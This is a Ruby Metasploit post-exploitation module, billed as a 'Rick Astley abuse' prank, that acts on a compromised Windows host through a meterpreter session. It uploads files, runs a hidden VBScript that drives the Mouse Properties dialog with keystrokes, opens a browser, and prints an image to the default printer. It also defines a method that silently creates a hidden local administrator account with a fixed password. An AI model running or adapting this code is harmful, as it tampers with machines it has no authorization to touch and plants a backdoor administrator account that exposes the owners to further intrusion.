require 'msf/core'
require 'msf/core/post/windows/accounts'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Registry

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Rickloaf Abuse Post module - Rick Astley will never give you up',
			'Description'   => %q{
					We're giving you more than the roll.  We're giving you the whole loaf.
					This module aims to be a comprehensive Rick Astley Abuse script, because the pimp hand must stay strong.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'DJ Manila Ice', 'Ian Parker', 'crymsen', 'porkchop', 'BMack'], 
			'Version'       => '1',
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))
		register_options(
                        [
                                OptString.new(   'COMMAND',  [false, 'COMMAND String to execute specific Rick functionality']),
                        ], self.class)
	end

	def run
		if datastore["COMMAND"].eql? "cursor"
			#make_rick_astley_cursor
			print_status("command was set to cursor")
		else
			# do this by default for now
			#make_rick_astley_cursor
			#4.times do
			#launchIERickRoll
			#end			
			#add_rick_astley_user
			print_rick_to_default_printer
		end
	end
	
	def make_rick_astley_cursor
		# path to the rick cursor
		path = ::File.join(Msf::Config.install_root, "data", "post")
		rick_cursor_filename = "rick.cur"
		rick_cur = ::File.join(path, rick_cursor_filename)
				
		session.fs.file.upload_file("%SystemRoot%\\Cursors\\#{rick_cursor_filename}", rick_cur)

		# write a quick script to change this cursor with keystrokes - it's ghetto but meh.		
		tempdir = client.fs.file.expand_path("%TEMP%")
		tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
		fd = client.fs.file.new(tempvbs, "wb")
		mouse_cursor_rickroll_script = "Set oShell = CreateObject(\"WScript.Shell\") \n" +
		"Set oSHApp = CreateObject(\"Shell.Application\") \n" +
		"Set oFSO = CreateObject(\"Scripting.FileSystemObject\") \n " +
		"oSHApp.ControlPanelItem cstr(\"main.cpl\") \n"  +
		"Do Until oShell.AppActivate (\"Mouse Properties\") \n" +
		"Loop \n" +
		"oShell.SendKeys \"+{TAB}\" \n" +
		"oShell.SendKeys \"{RIGHT}\" \n" +
		"oShell.SendKeys \"%B\" \n" +
		"oShell.SendKeys \"rick.cur\" \n" +
		"oShell.SendKeys \"{ENTER}\" \n" +
		"WScript.Sleep(2 * 1000) \n" +
		"oShell.SendKeys \"{ENTER}\" \n"
		  
		fd.write(mouse_cursor_rickroll_script)
		fd.close
		cmd = "start #{tempvbs}"

		session.sys.process.execute("cmd.exe /c cscript \"#{tempvbs}\"", nil, {'Hidden' => true})

		print_status("Mouse cursor changed.")

	end


	def add_rick_astley_user
		begin
			session.sys.process.execute("net user RickAstley nevagonnagive /add", nil, {'Hidden' => true})
			session.sys.process.execute("net localgroup administrators RickAstley /add", nil, {'Hidden' => true})
		rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
		end
	end

	def launchIERickRoll
	  session.sys.process.execute("iexplore.exe http://www.youtube.com/watch?v=oHg5SJYRHA0")
	end
	
	def print_rick_to_default_printer
		# parse default printer at the following locations depending on OS ver
		# # Windows XP
		# cscript prnmngr.vbs -g
		# # Windows 7
		# #cscript C:\Windows\System32\Printing_Admin_Scripts\en-US\prnmngr.vbs -g
		# rundll32    shimgvw.dll    ImageView_PrintTo /pt   xxx.png   "Default printer name"
		path = ::File.join(Msf::Config.install_root, "data", "post")
		rick_picture_filename = "rick.png"
		rick_png = ::File.join(path, rick_picture_filename)


		# printer registry key 
		keychunk = registry_getvaldata("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", "Device")
		default_printer = keychunk.split( /, */, 0 )[0]
		print_status("default printer is:" + default_printer)	

		# this only applies to windows xp		
		tempdir = client.fs.file.expand_path("%TEMP%")
		temp_picture = tempdir + "\\" +  Rex::Text.rand_text_alpha((rand(8)+6)) + ".png"
		print_status "uploading to => " + temp_picture
		session.fs.file.upload_file("#{temp_picture}", rick_png)
		#session.sys.process.execute("rundll32 shimgvw.dll ImageView_PrintTo /pt \"#{temp_picture}\" \"#{default_printer}\"", nil, {'Hidden' => true})
		drive = session.fs.file.expand_path("%SystemDrive%")
		path = drive + '\\Program Files\\'
		print_status("Printing rick out to the default printer")
		session.sys.process.execute("cmd.exe /c mspaint.exe /pt \"#{temp_picture}\"", nil, {'Hidden' => true})
	end
end
